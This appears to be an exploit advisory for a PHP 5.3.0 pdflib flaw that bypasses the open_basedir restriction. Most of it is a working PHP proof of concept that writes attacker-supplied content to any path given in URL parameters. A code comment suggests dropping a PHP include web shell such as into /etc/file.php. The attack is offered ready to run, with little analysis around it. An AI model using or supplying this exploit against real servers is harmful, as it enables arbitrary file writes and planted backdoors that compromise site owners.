PHP 5.3.0 pdflib file disclosure
================================


Description:
------------
Via this bug , attacker can save a file in path that not allowed in
open_basedir .
 
Reproduce code:
---------------
<?php
// Author : Sina Yazdanmehr 

if(!extension_loaded(&#039;pdf&#039;)){
   die(&#039;pdf extension required .&#039;);  
}else{
    $__PATH = $_GET[&#039;p&#039;]; /*The path that u want save file in .ex:
/etc/file.php*/
    $__VALUE = $_GET[&#039;v&#039;]; /*The text that u want save in file .ex:
<?php include $_GET[f];?>*/
    if(!isset($__PATH,$__VALUE)){
        
die(&#039;/expl.php?p=[path_u_want_save_file]/[file_name]&v=[value_u_want_sav
e_in_file]&#039;);
    }
    $__IRCRASH = pdf_new();
    pdf_open_file($__IRCRASH,$__PATH);
    pdf_begin_page($__IRCRASH,612,792);
    
pdf_add_note($__IRCRASH,100,650,200,750,$__VALUE,&#039;R3d.W0rm&#039;,&#039;note&#039;,0);
    pdf_end_page($__IRCRASH);
    pdf_close($__IRCRASH);
    pdf_delete($__IRCRASH);
    print(&#039;<p>IrCrash Security Team .</p>&#039;);
    print(&#039;<p>&#039; . $__PATH . "\n"  . &#039;created .</p>&#039;);}
?>
 
Expected result:
----------------
When attacker run this code , a file in a path that attacker input in
`p` in url , whith value that attacker input in `v` in url.



